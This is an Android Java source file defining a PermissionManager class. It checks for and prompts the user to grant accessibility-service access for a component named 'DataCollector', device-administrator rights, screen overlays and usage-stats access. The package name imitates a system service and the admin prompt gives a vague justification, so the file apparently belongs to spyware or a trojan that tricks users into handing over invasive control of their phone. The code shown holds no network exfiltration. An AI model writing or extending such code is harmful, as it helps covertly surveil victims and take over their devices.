package com.system.services.core.permissions;

import android.app.Activity;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityManager;

import java.util.List;

public class PermissionManager {
    private Context context;
    private DevicePolicyManager devicePolicyManager;
    
    public PermissionManager(Context context) {
        this.context = context;
        this.devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }
    
    // Check if accessibility service is enabled
    public boolean isAccessibilityServiceEnabled() {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        
        for (AccessibilityServiceInfo service : enabledServices) {
            if (service.getId().contains("com.system.services.core/.DataCollector")) {
                return true;
            }
        }
        return false;
    }
    
    // Request accessibility service permission
    public void requestAccessibilityPermission(Activity activity) {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        activity.startActivity(intent);
    }
    
    // Check if device admin is enabled
    public boolean isDeviceAdminEnabled() {
        return devicePolicyManager.isAdminActive(new ComponentName(context, "com.system.services.core.DeviceAdminReceiver"));
    }
    
    // Request device admin permission
    public void requestDeviceAdminPermission(Activity activity) {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, 
                        new ComponentName(context, "com.system.services.core.DeviceAdminReceiver"));
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                        "This app needs device admin permissions to function properly.");
        activity.startActivity(intent);
    }
    
    // Check if overlay permission is granted
    public boolean canDrawOverlays() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true;
        }
        return Settings.canDrawOverlays(context);
    }
    
    // Request overlay permission
    public void requestOverlayPermission(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            activity.startActivity(intent);
        }
    }
    
    // Check if usage stats permission is granted
    public boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return true;
        }
        
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, 
                                        android.os.Process.myUid(), 
                                        context.getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }
    
    // Request usage stats permission
    public void requestUsageStatsPermission(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            activity.startActivity(intent);
        }
    }
}
